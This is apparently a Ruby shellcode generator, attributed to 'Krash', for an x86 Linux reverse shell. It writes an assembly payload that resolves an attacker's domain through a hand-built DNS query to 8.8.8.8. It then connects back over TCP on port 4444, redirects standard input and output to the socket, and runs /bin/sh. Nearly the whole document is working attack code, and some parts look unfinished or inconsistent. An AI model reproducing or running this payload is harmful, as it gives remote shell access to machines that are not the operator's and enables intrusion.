#Reverse  TCP DNS Payload For x86 Linux
#Author : Krash


host = 'example.com'  # This needs to be removed.
port = 4444
# example : example.com
# domainname will be the name of the server in this case example
# the sub domain name will be .com

#
# Generate an assembly stub with the configured feature set and options.
#
# @option opts [Fixnum] :port The port to connect to
# @option opts [Fixnum] :host is the domain name that we want to have a return to.
#


def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],  # set Domain Name .. 
      retry_count: datastore['ReverseConnectRetries'],
      reliable:    false
    }
        # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end
    generate_reverse_udp(conf)
  end


Prefix       = ['AA', 'AA' ,'01', '00','00', '01' ,'00','00','00','00','00','00']
DomainSize   = [] # must contain the size of the domain name so example.com is 07
SubDomainSize= [] # must containe the size of the subdomain .com is 03
Suffix       = ['00', '00' , '01', '00' , '01' ,'00','00','00', ]


domainname     = host
Domain         = domainname.split(".")[0]
SubDomain      = domainname.split(".")[1]

#DomainSize.push((Domain.length).to_hex_string) 
DomainSize.push("%02X" % [ Domain.length.ord ])
#SubDomainSize.push((SubDomain.length).to_hex_string) 
SubDomainSize.push("%02X" % [ SubDomain.length.ord ])


# The total size of the DNS request
TotalSize = (Prefix.length) + (DomainSize.length) + (SubDomainSize.length) + (Suffix.length) + (Domain.length) + (SubDomain.length) 


# I need to pad the DNS request for it to fit into the stack.
if (TotalSize  % 4)    == 0
    puts 
    #print "[+] Everything looks good!\n"
elsif (TotalSize  % 4) == 3
    #print "[-] Padding With A Byte \n"
    Suffix.push('00')
elsif (TotalSize  % 4) == 2
    #print "[-] Padding With 2  Bytes \n"
    Suffix.push('00')
    Suffix.push('00')
elsif (TotalSize  % 4) == 1
    #print "[-] Padding With 3  Bytes \n"
    Suffix.push('00')
    Suffix.push('00')
    Suffix.push('00')
end



DomainNameByteArray = [] #store the domain name in hex bytes # in origional called 'bytearray'

# convert the domain name into hex bytes
# this should be a function...
#justdomain = domainname.split(".")[0]
Domain.chars do |c|
  byte = ( "%02X" % [ c.ord ])
  DomainNameByteArray.push(byte)
end


# convert the sub domain name into hex bytes
SubByteArray = []
SubDomain.chars do |c|
  byte = ( "%02X" % [ c.ord ])
  SubByteArray.push(byte)
end


EverythingArray = []



RPrefix        = Prefix.reverse
RDomainSize    = DomainSize.reverse
Rbytearray     = DomainNameByteArray.reverse #DomainNameByteArray in reverse
RSubDomainSize = SubDomainSize.reverse
RSuffix        = Suffix.reverse
RSubByteArray  = SubByteArray.reverse


def packstuff (stuff)
    for i in stuff
        EverythingArray.push(i)
    end
end

packstuff(RSuffix)
packstuff(RSubByteArray)
packstuff(RSubDomainSize)
packstuff(Rbytearray) # DomainNameByteArray
packstuff(RDomainSize)
packstuff(RPrefix)



EndianRequest = [] # This array should have the complete and correct response in the end. It will be then inserted into Payload and turned into shellcode.


#Just found out in Ruby Variables are NOT objects . This means you can only instansiate or dereference them - Not reassign.

i = 0
EndianRequest.push("  push 0x")
EverythingArray.each do |c|
      EndianRequest.push(c)
      i += 1
      if i % 4 == 0
          EndianRequest.push("\n")
          if i < TotalSize
          EndianRequest.push("  push 0x")
          end
      end
end

Payload = """
;Reverse  TCP DNS Payload For x86 Linux
;Author : Krash


section     .text
global      main   ;must be declared for linker (ld)

; Special thanks to James Routley For disecting the DNS protocol. 
; https://routley.io/tech/2017/12/28/hand-writing-dns-messages.html
; Special Thanks to Linux Trovalds for the SysCall map Needed for Syscall documentation . 
; https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl
; Thanks to  GOUTHAM MADHWARAJ for the reverse shell example. 
; https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/



main:                                         
    ; we create a socket fd, using again syscall 0x66 and argument SYS_SOCKET so ebx = 1  
    push   0x66
    pop    eax
    push   0x1 
    pop    ebx
    xor    ecx,ecx
    push   ecx
    ; but this times it will be a SOCK_DGRAM UDP, so 0x2 as argument 
    push   0x2  
    push   0x2 
    mov    ecx,esp
    int    0x80 ; SYS_SOCKET
    ; saving fd on the stack ; In reality I think I will save the port here instead 
    push eax


    push 0x08080808 ; 8.8.8.8 ; I love that this doesn't really need to be backwards.
    ;push 0x0100007F            ; 0100007F 1.0.0.127 for testing...

    xor edx,edx
    mov dh, 0x35  ; port 53; comment this for variable port 
    push dx       ; comment this for variable port 
                  ; push word PORT ; UNcomment this for variable port 
    push word 0x2 ; 




    mov ecx,esp   ; save pointer to ecx 
    push 0x10     ; addrlen 
    push ecx      ; pointer to sockaddr 
    push eax      ; fd received previously 
    mov ecx,esp   ;  
    mov esi,eax   ; save fd for next call 
    xor eax,eax 
    mov al,0x66  
    add bl,0x2   ; BL  = 3 SYS_CONNECT
    int 0x80      ;CALL  SYS_CONNECT


    ; now we send a UDP packet to open stateful firewall :] 
    xor eax,eax
    mov al,0x66   

    ; push 0x00000001 ; Origional Working Example        
    ; push 0x00010000
    ; push 0x6d6f6303
    ; push 0x656c706d
    ; push 0x61786507  ; sizeof (MyDomain) 72 6f 6f 74 6b 69 74 64 65 76 Now we move this in backwards
    ; push 0x00000000
    ; push 0x00000100
    ; push 0x0001AAAA

    #{EndianRequest.join('')}


    mov edx,esp ; Move the string to EDX so we can send it. 
    xor ecx,ecx
    push ecx  
    push 64 ; size of message to be sent is 8
    push edx 
    push esi 
    mov ecx,esp
    xor ebx,ebx 
    mov bl,0x9 
    int 0x80     ;CALL SYS_SEND

   ; cd ; Change Directional flag. I am not sure if it's needed yet.

    mov eax,  3 ; Prepare for SYSCALL_READ
    mov ebx,  3 ; 
    mov ecx, esp
    mov edx, 100
    int 0x80   ;CALL SYSCALL_READ
    
    add esp, eax
    sub esp, 4 
    mov eax ,[esp]
    push eax ; Probably not needed, I just want to ensure it's saved. 



 ;###################################
 ;
 ;     SET UP FOR REVERSE SHELL!!!
 ;
 ;###################################


    xor edx,edx ; clear out edx
	push 0x66 	; create socket

	pop eax ; syscall for socketcall

	push 0x1 
	pop ebx ; SOCKET_CALL from net.h = 1

	push edx ; push 0
	push ebx ; value of SOCK_STREAM = 1 got it from header /usr/src
	
    pop edx  ; KEEP out IP ADDR
    
    push 0x2 ; value 2 from /usr/include/i386-linux-gnu/bits/socket.h



	mov ecx,esp ; move ecx to top of the stack
	int 0x80 ; call interrupt

	mov esi,eax ; store returning socket in esi for further use


	;connect


	push 0x66
	pop eax           ;syscall for socket_call

	push 0x3
	pop ebx           ; SYS_CONNECT = 3 from /usr/include/linux/net.h



	
	push edx	      ; reverse shell IP 


	push word #{port}      ; 0x5c11  ; reverse shell port : 4444
	push word 0x2     ; AF_INET = PF_INET = 2
	mov edi, esp	  ; move top of the stack to edi to prepare struct
	push 0x10         ; size = 16
	push edi          ; push the pointer to created struct
	push esi          ; created sock
	mov ecx, esp      ; move top of the stack to ecx
	
	int 0x80          ; call system interrupt 


	;redirect Input, output and error to created sock

	mov ebx,esi
	xor ecx,ecx
	mov cl,0x2 ; initialize counter to 2

redirectIO:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns redirectIO

	                    ; spawn a shell using execve /bin/sh

	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp		; /bin//sh
	mov ecx, edx	    ; NULL
	mov al, 0xb	        ; syscall for execve
	int 0x80


"""

#puts Payload